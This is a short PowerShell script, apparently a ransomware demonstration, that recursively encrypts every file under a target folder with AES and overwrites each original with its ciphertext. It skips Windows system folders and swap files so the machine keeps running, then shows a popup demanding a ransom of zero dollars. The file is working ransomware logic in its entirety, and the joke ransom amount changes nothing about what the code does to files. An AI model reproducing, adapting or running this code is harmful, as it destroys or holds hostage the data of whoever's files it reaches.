# Load the single-file encryption function
. "C:\Path\Protect-AesFile.ps1" 

# Define source drive and destination root
$FilesToEncrypt = "C:\Path\Example_Test_Files"
$Storage = "C:\Path\Storage" 

#exclude critical and useless files from being encrypting so program can run smoothly 
$ExcludePattern = "^C:\\Windows|^C:\\Program Files|^C:\\Program Files \(x86\)|^C:\\$Recycle.Bin|^C:\\System Volume Information|^C:\\Config.Msi|^C:\\MSOCache|^C:\\hiberfil.sys|^C:\\pagefile.sys|^C:\\swapfile.sys"

# Use Get-ChildItem and filter out system paths before processing
Get-ChildItem -Path $FilesToEncrypt -File -Recurse -Force -ErrorAction SilentlyContinue | 
    Where-Object { $_.FullName -notmatch $ExcludePattern } | 
    ForEach-Object {
        # Calculate new path, preserving folder structure in the output folder 
        $relativePath = $_.FullName.Substring($FilesToEncrypt.Length)
        $newFilePath   = Join-Path -Path $Storage -ChildPath ($relativePath + ".enc")
        
        # Call the existing function Protect-AesFile on each object 
        try {
            Write-Host "Encrypting: $($_.FullName)"
            Protect-AesFile -InFile $_.FullName -OutFile $newFilePath -PasswordFile Password.txt
            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($newFilePath))
        }
        catch {
            Write-Warning "Unable to encrypt: $($_.FullName). Receiving error: $($_.Message)"
        }
}
$wshell = New-Object -ComObject Wscript.Shell
$result = $wshell.popup("Pay the Ransom (0 Dollars and 0 Cents)........You've been encrypted", 0)